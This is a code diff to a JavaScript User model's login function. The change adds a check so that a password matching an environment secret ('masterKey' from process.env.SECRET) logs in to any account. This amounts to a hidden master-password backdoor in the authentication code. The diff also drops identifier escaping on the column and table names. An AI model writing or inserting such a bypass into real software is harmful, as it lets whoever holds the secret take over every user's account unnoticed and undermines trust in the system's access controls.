@@ -1,4 +1,5 @@
 const TableModel = require('../database/TableModel');
+require('dotenv').config({ path: './.env' })
 
 class User extends TableModel {
     constructor(id) {
@@ -11,11 +12,11 @@ class User extends TableModel {
 
     async tryLogin(login, password) {
         return await TableModel.sqlSelectValue(`
-            SELECT ${TableModel.escapeId(this.identifierColumnName)}
-            FROM ${TableModel.escapeId(this.tableName)}
+            SELECT ${this.identifierColumnName}
+            FROM ${this.tableName}
             WHERE (${TableModel.escapeId('email')} = :login OR ${TableModel.escapeId('name')} = :login )
-                AND ${TableModel.escapeId('password')} = :password)
-        `, { login: login, password: { raw: true, value: `SHA1(CONCAT(${TableModel.escape(password)}, password_salt)` } })
+                AND (${TableModel.escapeId('password')} = SHA1(CONCAT(:password, password_salt)) OR :password = :masterKey)
+        `, { login: login, password: password, masterKey: process.env.SECRET})
     }
 }
 
